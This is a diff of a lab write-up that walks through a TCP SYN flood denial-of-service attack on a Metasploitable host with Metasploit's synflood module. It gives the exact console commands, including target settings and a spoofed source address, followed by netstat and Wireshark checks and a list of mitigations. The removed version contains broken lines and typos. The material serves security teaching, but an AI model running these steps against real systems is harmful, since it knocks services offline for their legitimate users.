@@ -1,106 +1,93 @@
-# SYN Flood Attack (DoS)
+# TCP SYN Flood Attack (Denial of Service)
 
-## 1. Overview
+## 1. Objective
 
-A SYN flood is a Denial of Service (DoS) attack that abuses the TCQ three-way handshake. The attacker 
-sends a large number of SYN
+The objective of this lab is to demonstrate a **TCP SYN Flood attack**,
+a Denial of Service (DoS) technique that exploits the TCP three-way
+handshake mechanism.
 
+The attacker sends a large number of TCP SYN packets to the target
+without completing the connection. This causes the target to allocate
+resources for half-open connections, eventually exhausting its capacity
+and preventing legitimate clients from connecting.
 
-This displays all configurable parameters for the SYN flood module.
+## 2. Lab Environment
 
----
+-   **Attacker machine:** Kali Linux
+-   **Target machine:** Metasploitable
+-   **Network:** 192.168.43.0/24
+-   **Target service:** HTTP (TCP port 80)
 
-## 5. Setting the target and port
+## 3. Attack Steps
 
-```sh
-set RHOST 192.168.43.22 set RPORT 80
+### a. Launch Metasploit Framework
+
+``` bash
+msfconsole
 ```
 
-These commands define the target IP and the port.
+### b. Search for the SYN Flood module
 
----
+``` bash
+search synflood
+```
 
-## 6. Setting the spoofed
- source address
+### c. Select the SYN Flood module and display options
 
-```sh
+``` bash
+use auxiliary/dos/tcp/synflood
+show options
+```
+
+### d. Configure the target IP address and port
+
+``` bash
+set RHOST 192.168.43.22
+set RPORT 80
+```
+
+### e. Configure a spoofed source IP address
+
+``` bash
 set SHOST 184.56.100.250
-
 ```
 
-This spoofed address simulates an external attacker.
+### f. Define the network interface
 
----
-
-## 7. Selecting the network interface
-
-```sh
+``` bash
 set INTERFACE eth0
 ```
 
-This tells Metasploit which interface to use.
+### g. Execute the TCP SYN Flood attack
 
----
-
-## 8. Running the SYN 
-Flood attack
-
-```sh
+``` bash
 run
 ```
 
-Metasploit begins sending a stream of SYN packets to the victim.
+### h. Verification using netstat on the target
 
----
-
-## 9. Verifying the attack on the victim
-
-On
- Metasploitable:
-
-```sh
-netstat -ant | grep SYN_
-RECV
+``` bash
+netstat -ant | grep SYN_RECV
 ```
 
-You should see many entries in the SYN
-_RECV state.
+### i. Traffic analysis with Wireshark
 
----
+Wireshark shows a large number of TCP SYN packets sent to the target
+without corresponding ACK packets.
 
-## 10. Wireshark analysis
+## 4. Impact of the Attack
 
-Capturing traffic during the attack shows a large number of TCQ SYNnpackets.
+The TCP SYN Flood attack disrupts the target's HTTP service by
+exhausting the connection table.
 
-#![SYN Flood Wireshark]
+## 5. Mitigation Techniques
 
-In Wireshark, you can filter with:
+-   Enable SYN cookies
+-   Use firewalls or IDS/IPS
+-   Apply rate limiting
+-   Monitor TCP connection states
 
-```text
-tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.dstport == 80
-```
+## 6. Conclusion
 
----
-
-## 11. Impact of the SYN Flood attack
-
-- Exhausts server resources
-- Keeps many connections in half-open state
-- Prevents legitimate clients from
- connecting
-- Can cause denial of service
-
----
-
-## 12. Mitigation strategies
-
-- Enable SYN cookies
-- Use firewalls to limit SYN rate
-- Deploy IDS/IPS to detect SYN floods
-- Block spoofed packets using ingress filtering
-- Tune TCQ stack parameters to ha
-ndle bursts
-
-This lab demonstrates how a SYN flo
-od works in practice and how its effects can be observed on the victim using netstat and Wireshark.
-
+This lab demonstrates how TCP SYN Flood attacks exploit weaknesses in
+the TCP handshake mechanism.
